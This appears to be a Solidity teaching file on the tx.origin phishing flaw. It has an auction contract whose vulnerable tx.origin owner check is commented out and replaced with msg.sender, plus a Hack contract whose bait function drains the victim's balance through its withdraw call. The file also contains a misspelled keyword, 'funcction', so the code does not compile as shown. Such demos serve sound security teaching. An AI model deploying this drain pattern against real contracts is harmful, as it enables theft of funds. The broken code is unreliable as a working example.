// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract AuctionTxOrigin {
    address owner;

    modifier onlyOwner() {
        // require(tx.origin == owner, "not an owner!"); // это уязвимость для взлома
        require(msg.sender == owner, "not an owner!"); 
        _;
    }

    constructor() payable {
        owner = msg.sender;
    }

    function withdraw(address _to) external onlyOwner{
        (bool ok,) = _to.call{value: address(this).balance}("");
        require(ok, "can`t send");
    }

    receive() external payable{}
}

contract Hack {
    AuctionTxOrigin toHack;

    constructor(address payable _toHack) payable {
        toHack = AuctionTxOrigin(_toHack);
    }

    funcction getYourMoney() external {
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "can`t send");

        toHack.withdraw(address(this));
    }

    receive() external payable{}
}



